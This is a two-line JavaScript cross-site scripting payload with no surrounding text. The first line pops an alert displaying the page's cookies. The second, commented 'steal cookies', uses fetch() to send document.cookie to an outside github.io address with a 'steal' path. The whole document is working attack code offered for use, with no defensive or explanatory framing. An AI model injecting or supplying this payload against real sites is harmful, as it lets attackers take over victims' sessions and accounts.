alert("XSS Exploited! Document Cookie: " + document.cookie);
// OR steal cookies:
fetch("https://justluthra.github.io/justluthra/steal?data=" + document.cookie);
